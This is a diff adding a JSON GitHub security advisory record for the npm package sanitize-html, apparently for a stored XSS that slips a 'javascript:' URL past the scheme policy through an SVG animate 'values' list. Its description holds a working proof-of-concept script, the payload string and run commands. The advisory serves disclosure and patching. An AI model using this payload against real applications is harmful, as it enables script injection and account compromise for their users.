@@ -1,0 +1,62 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-09-01T21:21:20Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "sanitize-html"
+  },
+  "Advisory": {
+    "DatabaseId": 423338,
+    "Id": "GSA_kwCzR0hTQS1nOHFxLTU3cDgtZ2d3Nc4ABnWq",
+    "GhsaId": "GHSA-g8qq-57p8-ggw5",
+    "References": [
+      {
+        "Url": "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-g8qq-57p8-ggw5"
+      },
+      {
+        "Url": "https://github.com/apostrophecms/apostrophe/pull/5552"
+      },
+      {
+        "Url": "https://github.com/apostrophecms/apostrophe/commit/1135516a1a4a8f9638641c460488a43d8af20081"
+      },
+      {
+        "Url": "https://github.com/apostrophecms/apostrophe/commit/38ff1106c8176b16c2da9872acd9b449adcbb949"
+      },
+      {
+        "Url": "https://github.com/apostrophecms/apostrophe/blob/main/packages/sanitize-html/CHANGELOG.md"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-g8qq-57p8-ggw5"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-g8qq-57p8-ggw5"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-84371"
+      }
+    ],
+    "Description": "### Summary\nWhen SVG animation is allowed, `attributeName=\"href\"` makes `values` a list of URL destinations. `sanitize-html` accepts a list that starts with a safe fragment even when `values` is explicitly scheme-checked, allowing a later `javascript:` destination to execute when the sanitized link is activated.\n\n### Details\n`index.js:371-383` validates each attribute as one flat URL. It does not recognize that `attributeName=\"href\"` gives the sibling `values` attribute SMIL URI-list semantics. For `values=\"#safe;javascript:...\"`, the leading fragment passes the flat check and the complete list is retained.\n\n### PoC\nThis was reproduced with `sanitize-html@2.17.6` and Chromium 150.0.7871.124. The configuration adds SVG animation to the defaults and applies the existing scheme policy to `values`; it does not allow `javascript:`. Save this as `poc.js`:\n\n```js\nconst sanitize = require('sanitize-html');\n\nconst input = `\u003csvg\u003e\u003ca\u003e\u003canimate attributeName=\"href\" values=\"#safe;javascript:alert('XSS')\" dur=\".01s\" fill=\"freeze\"\u003e\u003c/animate\u003e\u003ctext y=\"30\"\u003eClick me\u003c/text\u003e\u003c/a\u003e\u003c/svg\u003e`;\nconst output = sanitize(input, {\n  allowedTags: sanitize.defaults.allowedTags.concat(['svg', 'animate', 'text']),\n  allowedAttributes: {\n    ...sanitize.defaults.allowedAttributes,\n    animate: ['attributename', 'values', 'dur', 'fill'],\n    text: ['y']\n  },\n  allowedSchemesAppliedToAttributes:\n    sanitize.defaults.allowedSchemesAppliedToAttributes.concat(['values'])\n});\nconsole.log(output);\n```\n\nInstall and run it, then open `poc.html` and click `Click me`:\n\n```sh\nnpm install sanitize-html@2.17.6\nnode poc.js \u003e poc.html\n```\n\nThe output retains the `javascript:` entry, and clicking the sanitized SVG displays `XSS`. With `input` changed to `\u003ca href=\"javascript:alert(1)\"\u003econtrol\u003c/a\u003e`, the same configuration removes `href`.\n\n### Impact\nIn an application that accepts attacker-authored SVG animation, the attacker can store this payload without scripts or event handlers. A victim who activates the sanitized link executes JavaScript in the application's origin despite the configured scheme policy.\n\n### Suggested fix\nReject `attributeName` values selecting `href` or `xlink:href` on SVG `animate` and `set`, while retaining safe targets such as `fill`. Add `values`, `from`, and `to` regression cases.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-09-01T21:20:01Z",
+    "Severity": "MODERATE",
+    "Summary": "ApostropheCMS: Stored XSS via SVG SMIL URI-list scheme-policy bypass",
+    "UpdatedAt": "2026-09-01T21:21:20Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 5.4,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.17.7"
+      },
+      "VulnerableVersionRange": "\u003e= 1.9.0, \u003c= 2.17.6"
+    }
+  ]
+}
